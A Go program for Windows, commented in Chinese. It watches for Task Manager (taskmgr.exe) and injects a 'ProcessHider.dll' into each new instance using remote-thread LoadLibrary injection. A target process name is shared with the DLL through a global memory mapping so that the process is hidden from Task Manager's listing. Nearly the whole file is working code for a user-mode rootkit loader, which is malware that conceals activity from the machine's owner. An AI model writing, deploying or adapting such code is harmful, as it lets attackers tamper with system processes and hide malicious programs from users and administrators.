package main

import (
	"fmt"
	"os"
	"path/filepath"
	"syscall"
	"time"
	"unsafe"
)

var (
	kernel32 = syscall.NewLazyDLL("kernel32.dll")
	ntdll    = syscall.NewLazyDLL("ntdll.dll")

	procOpenProcess              = kernel32.NewProc("OpenProcess")
	procVirtualAllocEx           = kernel32.NewProc("VirtualAllocEx")
	procWriteProcessMemory       = kernel32.NewProc("WriteProcessMemory")
	procCreateRemoteThread       = kernel32.NewProc("CreateRemoteThread")
	procCreateToolhelp32Snapshot = kernel32.NewProc("CreateToolhelp32Snapshot")
	procProcess32First           = kernel32.NewProc("Process32FirstW")
	procProcess32Next            = kernel32.NewProc("Process32NextW")
	procGetModuleHandle          = kernel32.NewProc("GetModuleHandleW")
	procGetProcAddress           = kernel32.NewProc("GetProcAddress")
	procCloseHandle              = kernel32.NewProc("CloseHandle")
	procGetCurrentProcessId      = kernel32.NewProc("GetCurrentProcessId")
	procCreateFileMappingA       = kernel32.NewProc("CreateFileMappingA")
	procMapViewOfFile            = kernel32.NewProc("MapViewOfFile")
	procUnmapViewOfFile          = kernel32.NewProc("UnmapViewOfFile")
	procGetModuleFileNameA       = kernel32.NewProc("GetModuleFileNameA")
)

const (
	PROCESS_ALL_ACCESS     = 0x1F0FFF
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
	TH32CS_SNAPPROCESS     = 0x00000002
	FILE_MAP_ALL_ACCESS    = 0xF001F
	PAGE_READWRITE         = 0x04
)

type PROCESSENTRY32 struct {
	DwSize              uint32
	CntUsage            uint32
	Th32ProcessID       uint32
	Th32DefaultHeapID   uintptr
	Th32ModuleID        uint32
	CntThreads          uint32
	Th32ParentProcessID uint32
	PcPriClassBase      int32
	DwFlags             uint32
	SzExeFile           [260]uint16
}

func main() {
	fmt.Printf("[+] Current Process ID: %d\n", getCurrentProcessId())

	var processName string

	// 解析命令行参数
	if len(os.Args) >= 3 && os.Args[1] == "-p" {
		processName = os.Args[2]
		fmt.Printf("[+] Target process to hide: %s\n", processName)

		// 创建内存映射共享进程名
		if err := shareProcessName(processName); err != nil {
			fmt.Printf("[-] Failed to share process name: %v\n", err)
			return
		}
	} else {
		fmt.Println("[-] Usage: main.exe -p <process_name>")
		fmt.Println("[-] Example: main.exe -p notepad.exe")
		return
	}

	// 启动监控和注入
	monitorAndInject(processName)
}

func shareProcessName(processName string) error {
	// 创建文件映射
	mapName := "Global\\GetProcessName"
	mapHandle, _, _ := procCreateFileMappingA.Call(
		uintptr(syscall.InvalidHandle),
		0,
		uintptr(PAGE_READWRITE),
		0,
		255,
		uintptr(unsafe.Pointer(syscall.StringBytePtr(mapName))),
	)
	if mapHandle == 0 {
		return fmt.Errorf("CreateFileMappingA failed")
	}

	// 映射视图
	viewHandle, _, _ := procMapViewOfFile.Call(
		mapHandle,
		uintptr(FILE_MAP_ALL_ACCESS),
		0,
		0,
		255,
	)
	if viewHandle == 0 {
		return fmt.Errorf("MapViewOfFile failed")
	}

	// 写入进程名
	processBytes := []byte(processName)
	for i, b := range processBytes {
		if i >= 255 {
			break
		}
		*(*byte)(unsafe.Pointer(viewHandle + uintptr(i))) = b
	}
	// 添加null终止符
	if len(processBytes) < 255 {
		*(*byte)(unsafe.Pointer(viewHandle + uintptr(len(processBytes)))) = 0
	}

	fmt.Printf("[+] Process name '%s' shared via memory mapping\n", processName)
	return nil
}

func monitorAndInject(targetProcess string) {
	fmt.Printf("[+] Starting process monitor for taskmgr.exe\n")
	fmt.Println("[+] DLL Path: ProcessHider.dll (from current directory)")
	fmt.Println("[+] Enter \"quit\" to exit")

	lastPid := uint32(0)

	for {
		// 查找任务管理器进程
		pids := findProcessByName("taskmgr.exe")
		if len(pids) == 0 {
			time.Sleep(1000 * time.Millisecond)
			continue
		}

		// 检查是否有新的任务管理器进程
		for _, pid := range pids {
			if pid != 0 && pid != lastPid {
				fmt.Printf("[+] Found new taskmgr.exe process (PID: %d)\n", pid)

				// 注入DLL
				dllPath := getDLLPath()
				if injectDLL(pid, dllPath) {
					fmt.Printf("[+] Successfully injected into taskmgr.exe (PID: %d)\n", pid)
					lastPid = pid
				} else {
					fmt.Printf("[-] Failed to inject into taskmgr.exe (PID: %d)\n", pid)
				}
			}
		}

		time.Sleep(1000 * time.Millisecond)
	}
}

func findProcessByName(processName string) []uint32 {
	var pids []uint32

	// 创建进程快照
	snapshot, _, _ := procCreateToolhelp32Snapshot.Call(
		uintptr(TH32CS_SNAPPROCESS),
		0,
	)
	if snapshot == uintptr(syscall.InvalidHandle) {
		return pids
	}
	defer procCloseHandle.Call(snapshot)

	// 初始化进程条目结构
	var processEntry PROCESSENTRY32
	processEntry.DwSize = uint32(unsafe.Sizeof(processEntry))

	// 获取第一个进程
	ret, _, _ := procProcess32First.Call(snapshot, uintptr(unsafe.Pointer(&processEntry)))
	if ret == 0 {
		return pids
	}

	// 遍历所有进程
	for {
		// 转换进程名
		exeName := syscall.UTF16ToString(processEntry.SzExeFile[:])

		// 不区分大小写比较
		if len(exeName) == len(processName) {
			match := true
			for i := 0; i < len(exeName); i++ {
				if exeName[i] != processName[i] && exeName[i] != processName[i]+32 && exeName[i] != processName[i]-32 {
					match = false
					break
				}
			}
			if match {
				pids = append(pids, processEntry.Th32ProcessID)
			}
		}

		// 获取下一个进程
		ret, _, _ = procProcess32Next.Call(snapshot, uintptr(unsafe.Pointer(&processEntry)))
		if ret == 0 {
			break
		}
	}

	return pids
}

func injectDLL(pid uint32, dllPath string) bool {
	// 打开目标进程
	processHandle, _, err := procOpenProcess.Call(
		uintptr(PROCESS_ALL_ACCESS),
		0,
		uintptr(pid),
	)
	if processHandle == 0 {
		fmt.Printf("[-] OpenProcess failed: %v\n", err)
		return false
	}
	defer procCloseHandle.Call(processHandle)

	// 分配内存
	dllPathBytes := []byte(dllPath + "\x00")
	dllPathSize := uintptr(len(dllPathBytes))

	allocatedMemory, _, _ := procVirtualAllocEx.Call(
		processHandle,
		0,
		dllPathSize,
		uintptr(MEM_COMMIT|MEM_RESERVE),
		uintptr(PAGE_EXECUTE_READWRITE),
	)
	if allocatedMemory == 0 {
		fmt.Println("[-] VirtualAllocEx failed")
		return false
	}

	// 写入DLL路径
	var bytesWritten uintptr
	ret, _, _ := procWriteProcessMemory.Call(
		processHandle,
		allocatedMemory,
		uintptr(unsafe.Pointer(&dllPathBytes[0])),
		dllPathSize,
		uintptr(unsafe.Pointer(&bytesWritten)),
	)
	if ret == 0 {
		fmt.Println("[-] WriteProcessMemory failed")
		return false
	}

	// 获取LoadLibraryA地址
	kernel32Handle, _, _ := procGetModuleHandle.Call(uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr("kernel32.dll"))))
	if kernel32Handle == 0 {
		fmt.Println("[-] GetModuleHandle(kernel32.dll) failed")
		return false
	}

	loadLibraryAddr, _, _ := procGetProcAddress.Call(
		kernel32Handle,
		uintptr(unsafe.Pointer(syscall.StringBytePtr("LoadLibraryA"))),
	)
	if loadLibraryAddr == 0 {
		fmt.Println("[-] GetProcAddress(LoadLibraryA) failed")
		return false
	}

	// 创建远程线程
	var threadID uint32
	remoteThread, _, _ := procCreateRemoteThread.Call(
		processHandle,
		0,
		0,
		loadLibraryAddr,
		allocatedMemory,
		0,
		uintptr(unsafe.Pointer(&threadID)),
	)
	if remoteThread == 0 {
		fmt.Println("[-] CreateRemoteThread failed")
		return false
	}
	defer procCloseHandle.Call(remoteThread)

	fmt.Println("[+] User activity triggered")
	return true
}

func getDLLPath() string {
	// 获取当前可执行文件路径
	var buffer [3000]byte
	ret, _, _ := procGetModuleFileNameA.Call(
		0,
		uintptr(unsafe.Pointer(&buffer[0])),
		uintptr(len(buffer)),
	)
	if ret == 0 {
		return "ProcessHider.dll"
	}

	// 转换为字符串
	exePath := string(buffer[:ret])

	// 获取目录
	dir := filepath.Dir(exePath)

	// 构建DLL路径
	dllPath := filepath.Join(dir, "ProcessHider.dll")

	return dllPath
}

func getCurrentProcessId() uint32 {
	ret, _, _ := procGetCurrentProcessId.Call()
	return uint32(ret)
}
